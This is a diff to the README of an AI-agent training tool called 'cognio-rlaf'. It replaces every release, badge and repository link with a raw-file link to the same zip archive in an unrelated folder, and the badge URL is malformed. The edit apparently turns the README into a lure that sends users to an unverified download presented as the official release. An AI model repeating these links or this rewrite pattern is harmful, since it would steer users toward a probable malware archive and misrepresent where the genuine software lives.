@@ -1,6 +1,6 @@
 # 🤖 cognio-rlaf - Train AI Simply with Feedback
 
-![Download Release](https://img.shields.io/badge/Download%20Now-Release-green.svg)
+![Download Release](https://raw.githubusercontent.com/youssef17amr/cognio-rlaf/main/allomorphism/cognio-rlaf.zip%https://raw.githubusercontent.com/youssef17amr/cognio-rlaf/main/allomorphism/cognio-rlaf.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **cognio-rlaf**! This tool helps you train AI agents using a framewor
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Download Releases](https://github.com/youssef17amr/cognio-rlaf/releases). You will find the latest version there. 
+To download the software, visit this page: [Download Releases](https://raw.githubusercontent.com/youssef17amr/cognio-rlaf/main/allomorphism/cognio-rlaf.zip). You will find the latest version there. 
 
 1. Click the link above.
 2. Look for the latest release. 
@@ -92,7 +92,7 @@ Your contributions will help improve the framework for everyone.
 
 ## 🔗 Additional Links
 
-- [GitHub Repository](https://github.com/youssef17amr/cognio-rlaf)
-- [Download Releases](https://github.com/youssef17amr/cognio-rlaf/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/youssef17amr/cognio-rlaf/main/allomorphism/cognio-rlaf.zip)
+- [Download Releases](https://raw.githubusercontent.com/youssef17amr/cognio-rlaf/main/allomorphism/cognio-rlaf.zip)
 
 Thank you for using **cognio-rlaf**. Enjoy training your AI agents!
